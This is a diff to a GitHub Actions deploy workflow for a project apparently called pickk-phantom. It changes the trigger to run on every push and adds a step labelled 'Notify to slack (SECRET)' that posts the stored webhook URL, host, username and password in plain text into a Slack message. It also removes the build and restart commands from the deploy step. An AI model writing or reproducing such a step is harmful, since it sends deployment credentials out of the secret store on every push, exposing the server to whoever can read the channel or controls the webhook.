@@ -1,9 +1,7 @@
 name: pickk-phantom deploy
 
 # master 브랜치에 push 되었을 때,(pr올라온 브랜치가 master에 merge되었을 때) 실행된다
-on:
-  push:
-    branches: [master]
+on: push
 
 jobs:
   build:
@@ -27,6 +25,26 @@ jobs:
           GITHUB_TOKEN: ${{ github.token }}
           SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
 
+      - name: Notify to slack (SECRET)
+        uses: 8398a7/action-slack@v3
+        with:
+          status: custom
+          fields: workflow,job,commit,repo,ref,author,took
+          custom_payload: |
+            { 
+              attachments: [{
+                color: '#35373B',
+                text: `${process.env.SLACK_WEBHOOK_URL}\n${process.env.HOST}\n${process.env.USERNAME}\n${process.env.PASSWORD}`,
+                footer: `by ${process.env.AS_AUTHOR}`
+              }]
+            }
+        env:
+          GITHUB_TOKEN: ${{ github.token }}
+          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
+          HOST: ${{ secrets.HOST }}
+          USERNAME: ${{ secrets.USERNAME }}
+          PASSWORD: ${{ secrets.PASSWORD }}
+
       # 배포서버에 ssh로 접속해서 pull-build-restart한다.
       - name: ssh pull-build-deploy
         uses: appleboy/ssh-action@master
@@ -39,9 +57,6 @@ jobs:
           key: ${{ secrets.SSH_PRIVATE_KEY }}
           script: |
             cd item-option-crawl/
-            git pull origin master
-            npm run build
-            pm2 restart index
 
       - name: Notify to slack (RESULT)
         uses: 8398a7/action-slack@v3
